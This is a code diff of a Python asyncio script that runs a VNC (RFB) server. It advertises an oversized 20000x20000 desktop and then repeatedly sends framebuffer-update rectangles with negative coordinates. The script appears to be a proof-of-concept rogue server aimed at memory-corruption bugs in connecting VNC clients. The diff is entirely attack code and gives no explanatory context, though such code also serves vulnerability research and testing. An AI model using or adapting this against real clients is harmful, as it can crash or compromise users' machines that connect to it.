@@ -16,8 +16,8 @@ def framebufferUpdate(num: int, rectangle, pixelData) -> bytes:
     return msg
 
 async def callback(reader: StreamReader, writer: StreamWriter):
-    width = 300
-    height = 300
+    width = 20000
+    height = 20000
     bpp = 32
     writer.write(b"RFB 003.008\n") # protocol handshake
     await reader.readline() # response
@@ -39,12 +39,16 @@ async def callback(reader: StreamReader, writer: StreamWriter):
                         7, # Name length
             ) + ("desktop".encode("latin-1")) # Name
         )
-    data = b'\x00'*width*height*int(bpp/4)
-    y = -width
-    x = -height
+    w = 30
+    h = 1
+    data = b'\x00'*w*h*int(bpp/4)
+    y = -w
+    x = -h
+    print(f"x: {x}, y: {y}, len: {len(data)}")
 
     while True:
-        writer.write(framebufferUpdate(1, (x, y, width, height, 0), data))
+        writer.write(framebufferUpdate(1, (x, y, w, h, 0), data))
+        print("tick")
         await sleep(5)
 
 async def main():
